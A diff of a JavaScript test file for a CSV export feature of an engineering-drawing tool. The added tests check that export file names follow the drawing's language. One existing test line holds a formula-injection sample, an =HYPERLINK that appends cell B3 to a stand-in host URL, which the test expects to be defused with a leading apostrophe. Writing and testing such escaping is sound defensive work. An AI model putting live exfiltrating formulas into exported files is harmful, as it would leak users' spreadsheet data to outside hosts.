@@ -37,3 +37,9 @@ test("text that Excel would run as a formula gets an apostrophe; plain numbers s
   assert.equal(lines[1], `1;"'=HYPERLINK(""http://x.invalid/?""&B3,""Detalii"")";-2;'@SUM(A1);'+0,1/-0,05`);
   assert.equal(lines[2], "2;'-Arbore;+5;-0,02;Ra 1,6");
 });
+
+test("file names follow the drawing's language", () => {
+  assert.equal(csvName("piesa.pdf", { type: "bom" }, "en"), "piesa_parts.csv");
+  assert.equal(csvName("piesa.pdf", { type: "revtab" }, "en"), "piesa_revisions.csv");
+  assert.equal(csvName("piesa.pdf", { type: "holes" }), "piesa_gauri.csv");
+});
